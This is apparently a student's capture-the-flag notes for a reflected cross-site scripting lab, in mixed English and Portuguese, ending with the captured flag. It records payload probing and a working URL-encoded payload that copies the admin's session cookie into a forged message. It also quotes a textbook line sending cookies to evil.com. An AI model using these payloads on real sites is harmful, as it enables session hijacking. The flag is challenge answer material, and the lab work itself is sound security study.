@@ -1,0 +1,107 @@
+-> domain: obxssession.is.hackthe.space
+
+-> cross site scripting:
+A Cross-Site Scripting (XSS) vulnerability is a type of code
+injection vulnerability in which the attacker manages to inject
+JavaScript code, that is executed in the browser of the victim, in
+the pages of a web application
+    1. Reflected XSS
+    2. Stored XSS
+    3. DOM-based XSS
+
+
+-> I need to send a link to a JavaScript?! 
+    Link needs to be url-encoded!!!!!
+
+
+Questões:
+1) "I wrote an exploit which works perfectly fine locally if I open the link with my user and any test users I create. I doesn't seem to work for the admin user. Any tips what I could be doing wrong?"
+    => NO BLANKS && Be sure that your payload works with the target browser then (headless chromium)
+
+2) RESPOSTA: You need to send a message to the admin of the website. The message should contain the link that triggers the XSS vulnerability and exploits the bot running on behalf of the admin. To send this message you have the "send message" functionality provided by the website: you just need to fill the form and click "send"
+
+
+https://www.urlencoder.org/
+https://example.org/?theparam=PASTEURLENCODEDCONTENTHERE
+
+
+Goal:
+    -> Login the administrators private area
+    -> Send a link with an attack
+    -> Link must be send from the same domain.
+    -> using xss get access to the cookie session -> Reflected XSS maybe
+
+
+IT IS PROBABLY REFLECTED XSS AS WE ARE SENDING A LINK TO THE ADMIN AND WAITING FOR HIM TO CLICK ON THE URL WE ARE SENDING
+
+
+1. Send a link with a attack, this attack gets access to the cookie session of the admin!
+2. We need to write an js!
+
+
+TO DO:
+    1. How to get cookie
+    2. Where do I have a vulnerability
+    3. Develop Script
+    4. URLEncode Script
+    3. Send to admin
+
+https://obxssession.is.hackthe.space/
+
+
+Notas:
+    all <>,'," are being encoded: test -> write a message with those characters, analyse the "código fonte" -> it turns out that they are not printed like the chars themselves.
+    123&lt;&gt;&#39;&#39;&#34;
+
+
+    it doesn't look like script is being handle.... -> it has the same reaction for all the urls that don't exist
+
+https://obxssession.is.hackthe.space/test?theparam=<SCRIPT>alert(1)</SCRIPT>
+
+https://obxssession.is.hackthe.space/test?theparam=<SCRIPT>alert(document.cookie)</SCRIPT>
+
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+https://obxssession.is.hackthe.space/register?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+
+
+http://bank.com/search.php?term=<script> window.open(
+"http://evil.com/?cookie = " + document.cookie ) </script>
+
+
+-> WE NEED TO FIND A ENDPOINT ("A PAGE IN THIS WEBSITE") THAT IS SUSCEPTIBLE TO XSS
+-> USE THAT PAGE TO SET OUR LINK
+-> SEND THAT LINK TO THE ADMIN
+
+    NOT:
+    send, messages, 
+    MAYBE:
+    profile (ou então pode ser porque não tem nenhum input)
+
+
+    NEEDS TO HAVE AN INJECTION POINT!!!!!
+        op1) REGISTER
+        op2) LOGIN
+        op3) SEND: properly escapes HTML by changing < to &lt, for example
+                it is not possible to inject HTML (and thus do xSS)
+                 
+
+
+
+HOW TO PREVENT IT:
+    > The programmer needs to make sure that the input im writing shouldn't be actual code (aka scripts)
+
+
+
+-> forçar a submissão de uma mensagem (usar o form do send) para me enviar uma mensagem que terá o cookie do admin:
+
+
+Codigo do tipo:
+p=<form name="Attack" action="/send" method="POST"> <input name="subject" value="subject random"> <input name="receiver" value=66> <input name="contents" value="somerandommessage"> </form> <img src=/ onerror="document.Attack.contents.value = document.cookie;document.Attack.submit();"></img>
+
+
+https://obxssession.is.hackthe.space/error?m=theory%20is%20private&p=/theory/5p%3D%3Cform%20name%3D%22Attack%22%20action%3D%22%2Fsend%22%20method%3D%22POST%22%3E%20%3Cinput%20name%3D%22subject%22%20value%3D%22subject%20random%22%3E%20%3Cinput%20name%3D%22receiver%22%20value%3D27%3E%20%3Cinput%20name%3D%22contents%22%20value%3D%22somerandommessage%22%3E%20%3C%2Fform%3E%20%3Cimg%20src%3D%2F%20onerror%3D%22document.Attack.contents.value%20%3D%20document.cookie%3Bdocument.Attack.submit%28%29%3B%22%3E%3C%2Fimg%3E
+
+
+flag:
+NO_I7_C4N7_B3_MY_M1ND_IS_G0NN4_EXPL0DE_AAAAaaAA
